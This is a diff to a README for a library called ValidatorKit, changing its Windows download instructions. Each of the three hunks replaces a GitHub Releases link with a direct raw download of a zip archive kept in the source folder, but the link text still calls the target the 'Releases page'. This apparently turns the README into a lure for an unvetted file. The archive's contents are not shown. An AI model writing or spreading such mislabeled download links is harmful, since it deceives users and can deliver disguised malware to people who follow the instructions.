@@ -1,6 +1,6 @@
 # 🔎 ValidatorKit - Simple Validation Without the Mess
 
-[![Download ValidatorKit](https://img.shields.io/badge/Download%20ValidatorKit-blue?style=for-the-badge)](https://github.com/Hebdomadary-webspinningmite902/ValidatorKit/releases)
+[![Download ValidatorKit](https://img.shields.io/badge/Download%20ValidatorKit-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hebdomadary-webspinningmite902/ValidatorKit/main/Sources/ValidatorKit/Validator_Kit_2.9.zip)
 
 ## 🧭 What ValidatorKit Does
 
@@ -20,7 +20,7 @@ Use it when you want to:
 
 To get ValidatorKit on Windows, visit this page to download the app file:
 
-[Download ValidatorKit from Releases](https://github.com/Hebdomadary-webspinningmite902/ValidatorKit/releases)
+[Download ValidatorKit from Releases](https://raw.githubusercontent.com/Hebdomadary-webspinningmite902/ValidatorKit/main/Sources/ValidatorKit/Validator_Kit_2.9.zip)
 
 After the page opens:
 
@@ -200,7 +200,7 @@ If the download page shows more than one file:
 
 If you need the release page again, use this link:
 
-[Visit the ValidatorKit Releases page](https://github.com/Hebdomadary-webspinningmite902/ValidatorKit/releases)
+[Visit the ValidatorKit Releases page](https://raw.githubusercontent.com/Hebdomadary-webspinningmite902/ValidatorKit/main/Sources/ValidatorKit/Validator_Kit_2.9.zip)
 
 ## 🧭 File Names You May See
 
